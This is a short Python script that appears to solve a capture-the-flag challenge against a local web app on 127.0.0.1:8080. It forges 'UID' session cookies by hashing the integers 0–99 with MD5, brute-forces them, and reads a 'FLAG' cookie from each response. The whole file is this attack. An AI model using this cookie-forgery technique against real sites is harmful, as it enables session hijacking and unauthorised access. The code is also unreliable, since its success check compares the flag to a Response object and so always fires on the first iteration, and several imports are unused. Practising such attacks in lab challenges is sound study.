import hashlib
import codecs
from http import cookies
from pip._vendor import requests
import numpy as np
from dataclasses import replace
import base64


# IP
ip = "http://127.0.0.1:8080"
ry = requests.cookies.RequestsCookieJar()
res = requests.patch(url=ip, cookies=ry)
print(res.cookies)
ry.update(res.cookies)
res = requests.patch(url=ip, cookies=ry)
print(res.cookies)

for i in range(100):
    # convert the number to a byte
    byte_i = str.encode(str(i))

    # obtain the MD5
    md5_i = hashlib.md5(byte_i).hexdigest()

    #     """ Send request to the web application """
    # set the cookie
    cookies = {"UID": str(md5_i)}
    r = requests.post(ip, cookies=cookies)

    # get the i-th flag
    flag_i = r.cookies["FLAG"]

    # if the content of the cookie is different to the 100th one, we have the flag
    if flag_i != res:
        print(f"FLAG found at iteration={i}\t{flag_i}")
        break
